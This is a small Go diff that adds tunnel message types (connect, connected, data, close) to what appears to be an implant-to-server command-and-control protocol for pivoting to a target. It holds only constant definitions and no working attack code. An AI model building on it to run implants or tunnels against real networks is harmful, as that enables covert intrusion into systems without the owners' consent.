@@ -11,6 +11,10 @@ const (
 	MsgTaskRequest       uint32 = 0x04 // Implant → Server (poll for tasks)
 	MsgTaskResponse      uint32 = 0x05 // Server → Implant (list of tasks)
 	MsgTaskResult        uint32 = 0x06 // Implant → Server (task output)
+	MsgTunnelConnect     uint32 = 0x10 // Server → Implant (request tunnel to target)
+	MsgTunnelConnected   uint32 = 0x11 // Implant → Server (tunnel connect result)
+	MsgTunnelData        uint32 = 0x12 // Bidirectional (data chunk on tunnel)
+	MsgTunnelClose       uint32 = 0x13 // Bidirectional (close tunnel session)
 	MsgError             uint32 = 0xFF // Either direction
 )
 
